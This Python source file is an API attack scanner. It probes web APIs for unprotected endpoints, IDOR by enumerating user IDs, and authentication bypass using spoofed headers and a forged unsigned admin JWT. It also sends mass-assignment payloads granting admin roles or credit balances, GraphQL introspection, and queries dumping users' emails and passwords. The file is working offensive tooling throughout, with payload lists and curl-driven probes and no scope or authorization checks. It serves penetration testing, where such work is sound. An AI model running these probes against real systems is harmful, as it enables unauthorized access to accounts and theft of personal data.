"""API Fuzzer — endpoint discovery, IDOR, auth bypass, rate limit, GraphQL"""
import subprocess, re, json, time, urllib.parse, concurrent.futures

API_WORDLIST = [
    "/api","/api/v1","/api/v2","/api/v3","/api/users","/api/user",
    "/api/admin","/api/auth","/api/login","/api/logout","/api/register",
    "/api/profile","/api/me","/api/account","/api/accounts",
    "/api/products","/api/product","/api/items","/api/orders","/api/order",
    "/api/payments","/api/payment","/api/transactions",
    "/api/config","/api/settings","/api/health","/api/status","/api/ping",
    "/api/search","/api/upload","/api/files","/api/export","/api/import",
    "/api/token","/api/refresh","/api/keys","/api/webhooks",
    "/api/analytics","/api/logs","/api/reports","/api/dashboard",
    "/api/notifications","/api/messages","/api/comments","/api/posts",
    "/v1","/v2","/v3","/v1/users","/v2/users","/v1/admin",
    "/rest/api","/rest/v1","/rest/v2",
    "/graphql","/graphiql","/__graphql","/api/graphql","/gql",
]

IDOR_PATHS = [
    "/api/users/{id}","/api/user/{id}","/api/account/{id}",
    "/api/orders/{id}","/api/order/{id}","/api/profile/{id}",
    "/api/documents/{id}","/api/files/{id}","/api/invoices/{id}",
    "/api/tickets/{id}","/api/messages/{id}","/api/reports/{id}",
    "/user/{id}","/account/{id}","/profile/{id}",
]

AUTH_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"Authorization": "null"},
    {"Authorization": "undefined"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
]

GRAPHQL_INTROSPECTION = """
{
  __schema {
    types { name kind description }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

GRAPHQL_QUERIES = [
    '{"query":"{ __typename }"}',
    '{"query":"{ __schema { types { name } } }"}',
    '{"query":"query { users { id email password } }"}',
    '{"query":"query { user(id: 1) { id email role } }"}',
    '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"}',
]

MASS_ASSIGN_FIELDS = [
    {"role":"admin"},{"is_admin":True},{"admin":True},
    {"isAdmin":True},{"permissions":["admin"]},{"role":"superuser"},
    {"verified":True},{"email_verified":True},{"balance":99999},
    {"credits":99999},{"premium":True},{"subscription":"premium"},
]

def curl(url, method="GET", data=None, headers=None, timeout=8):
    cmd = ["curl","-sk","--max-time",str(timeout),"-L"]
    if method != "GET": cmd += ["-X", method]
    if data:
        if isinstance(data, str):
            cmd += ["-d", data, "-H", "Content-Type: application/json"]
        else:
            cmd += ["-d", json.dumps(data), "-H", "Content-Type: application/json"]
    if headers:
        for k,v in headers.items(): cmd += ["-H", f"{k}: {v}"]
    cmd += ["-w", "\n__STATUS__%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        parts = r.stdout.rsplit("__STATUS__", 1)
        body = parts[0]
        code = int(parts[1]) if len(parts) > 1 else 0
        return body, code
    except: return "", 0

def probe_endpoint(base, path, timeout=5):
    url = base + path
    cmd = ["curl","-sk","-o","/dev/null","-w","%{http_code}","--max-time",str(timeout),url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return int(r.stdout.strip() or 0)
    except: return 0

def discover_endpoints(base):
    findings = []
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(probe_endpoint, base, path): path for path in API_WORDLIST}
        for fut in concurrent.futures.as_completed(futures):
            path = futures[fut]
            code = fut.result()
            if code in (200, 201, 204, 301, 302, 401, 403, 405):
                severity = "HIGH" if code in (200,201,204) else "MEDIUM" if code == 403 else "INFO"
                findings.append({
                    "type":"api_endpoint","value":path,"status":code,
                    "severity":severity,
                    "note":f"{'ACCESSIBLE' if code < 300 else 'FORBIDDEN' if code == 403 else 'REDIRECT' if code in (301,302) else 'METHOD_NOT_ALLOWED' if code == 405 else 'UNAUTH'}"
                })
                if code in (200, 201, 204, 405):
                    found.append(path)
    return findings, found

def test_idor(base, token=None):
    findings = []
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    # Try ID ranges 1-5 and some high numbers
    test_ids = [1, 2, 3, 4, 5, 100, 1000, 9999]
    for path_template in IDOR_PATHS:
        for id_val in test_ids[:3]:
            path = path_template.replace("{id}", str(id_val))
            url = base + path
            body, code = curl(url, headers=headers, timeout=6)
            if code == 200 and len(body) > 10:
                # Try access without token
                body_noauth, code_noauth = curl(url, timeout=6)
                if code_noauth == 200 and len(body_noauth) > 10:
                    findings.append({
                        "type":"idor_unauth","endpoint":path,"id":id_val,
                        "evidence":body_noauth[:150],"severity":"HIGH",
                        "note":"Resource accessible without authentication"
                    })
                # Try adjacent ID
                if id_val > 1:
                    path2 = path_template.replace("{id}", str(id_val + 1))
                    body2, code2 = curl(base + path2, headers=headers, timeout=6)
                    if code2 == 200 and len(body2) > 10:
                        findings.append({
                            "type":"idor_horizontal","endpoint":path_template,
                            "ids_tested":[id_val, id_val+1],"severity":"HIGH",
                            "note":"Horizontal IDOR — access to other users' resources"
                        })
                break
        time.sleep(0.1)
    return findings

def test_auth_bypass(base, endpoints):
    findings = []
    protected = [e for e in endpoints if any(k in e for k in ["admin","user","account","profile","dashboard"])]
    if not protected:
        protected = ["/api/admin", "/admin", "/api/users"]
    for endpoint in protected[:5]:
        url = base + endpoint
        body_base, code_base = curl(url, timeout=6)
        for header_set in AUTH_BYPASS_HEADERS:
            body, code = curl(url, headers=header_set, timeout=6)
            if code in (200, 201) and code_base not in (200, 201):
                findings.append({
                    "type":"auth_bypass","endpoint":endpoint,
                    "headers":header_set,"status":code,
                    "evidence":body[:200],"severity":"CRITICAL",
                    "note":"Auth bypass via header injection"
                })
            time.sleep(0.05)
    return findings

def test_rate_limit(base, endpoints):
    findings = []
    target = next((e for e in endpoints if "login" in e or "auth" in e), None)
    if not target:
        target = "/api/login"
    url = base + target
    codes = []
    for _ in range(20):
        _, code = curl(url, method="POST",
                       data={"username":"test@test.com","password":"test123"}, timeout=5)
        codes.append(code)
    if 429 not in codes and not any(c in codes for c in [420, 503]):
        findings.append({
            "type":"no_rate_limit","endpoint":target,"codes":list(set(codes)),
            "severity":"MEDIUM","note":"20 rapid requests — no rate limiting detected"
        })
    return findings

def test_mass_assignment(base, endpoints):
    findings = []
    register_ep = next((e for e in endpoints if "register" in e or "signup" in e), None)
    update_ep = next((e for e in endpoints if "profile" in e or "account" in e or "user" in e), None)
    targets = [ep for ep in [register_ep, update_ep] if ep]
    if not targets:
        targets = ["/api/register", "/api/profile"]
    for ep in targets:
        for extra_fields in MASS_ASSIGN_FIELDS[:5]:
            base_data = {"username": "testxc", "password": "Pass123!", "email": "testxc@test.com"}
            base_data.update(extra_fields)
            body, code = curl(base + ep, method="POST", data=base_data, timeout=6)
            if code in (200, 201):
                body_l = body.lower()
                if any(str(v).lower() in body_l for v in extra_fields.values() if isinstance(v, (str, bool))):
                    findings.append({
                        "type":"mass_assignment","endpoint":ep,"fields":extra_fields,
                        "evidence":body[:200],"severity":"HIGH",
                        "note":"Mass assignment — injected field reflected/accepted"
                    })
            time.sleep(0.2)
    return findings

def test_graphql(base):
    findings = []
    gql_endpoints = ["/graphql","/api/graphql","/graphiql","/__graphql","/gql"]
    for ep in gql_endpoints:
        url = base + ep
        # Try introspection
        for q in GRAPHQL_QUERIES[:2]:
            body, code = curl(url, method="POST", data=q, timeout=8)
            if code == 200 and ("__schema" in body or "queryType" in body or "__typename" in body):
                findings.append({
                    "type":"graphql_introspection","endpoint":ep,
                    "evidence":body[:300],"severity":"MEDIUM",
                    "note":"GraphQL introspection enabled — schema exposed"
                })
                # Try data dump queries
                for dq in GRAPHQL_QUERIES[2:4]:
                    body2, code2 = curl(url, method="POST", data=dq, timeout=8)
                    if code2 == 200 and "email" in body2.lower():
                        findings.append({
                            "type":"graphql_data_leak","endpoint":ep,
                            "query":dq,"evidence":body2[:300],"severity":"HIGH",
                            "note":"GraphQL — sensitive data returned without auth"
                        })
                break
        time.sleep(0.2)
    return findings

def test_verb_tampering(base, endpoints):
    findings = []
    verbs = ["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE"]
    for ep in endpoints[:10]:
        url = base + ep
        allowed = []
        for verb in verbs:
            _, code = curl(url, method=verb, timeout=5)
            if code not in (404, 405, 400):
                allowed.append(f"{verb}:{code}")
        if any("DELETE" in a or "TRACE" in a for a in allowed):
            findings.append({
                "type":"verb_tampering","endpoint":ep,"allowed":allowed,
                "severity":"MEDIUM","note":"Dangerous HTTP verbs allowed"
            })
    return findings

def run(target, token=None, full=False):
    base = re.sub(r'/$', '', target)
    findings = []

    ep_findings, found_eps = discover_endpoints(base)
    findings += ep_findings

    findings += test_idor(base, token)
    findings += test_auth_bypass(base, found_eps)
    findings += test_rate_limit(base, found_eps)
    findings += test_graphql(base)

    if full:
        findings += test_mass_assignment(base, found_eps)
        findings += test_verb_tampering(base, found_eps)

    return {"module":"apifuzz","target":base,"endpoints_found":found_eps,"findings":findings}
